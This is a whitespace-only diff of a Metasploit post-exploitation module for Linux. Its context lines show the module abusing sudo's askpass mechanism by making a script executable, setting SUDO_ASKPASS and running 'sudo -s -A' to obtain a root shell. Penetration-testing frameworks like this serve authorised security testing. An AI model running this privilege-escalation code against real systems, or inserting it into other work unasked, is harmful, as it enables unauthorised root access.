@@ -35,7 +35,7 @@ class Metasploit3 < Msf::Post
 				'Author'        => [ 'todb <todb[at]metasploit.com>'],
 				'Version'       => '$Revision: $',
 				'Platform'      => [ 'linux' ],
-				'References'    => 
+				'References'    =>
 					[
 						# Askpass first added March 2, 2008, looks like
 						[ 'URL', 'http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h']
@@ -105,14 +105,14 @@ class Metasploit3 < Msf::Post
 					cmd_exec("chmod +x #{askpass_sh}")
 					vprint_status "Setting environment variable."
 					# Bruteforce the set command. At least one should work.
-					cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}") 
+					cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}")
 					cmd_exec("export SUDO_ASKPASS=#{askpass_sh}")
 					vprint_status "Executing sudo -s -A"
 					cmd_exec("sudo -s -A")
 				end
 			rescue ::Timeout::Error
 				print_error "SUDO: Sudo with a password timed out."
-			rescue 
+			rescue
 				print_error "SUDO: Sudo with a password failed. Check the session log."
 			end
 			# askpass_cleanup(askpass_sh)
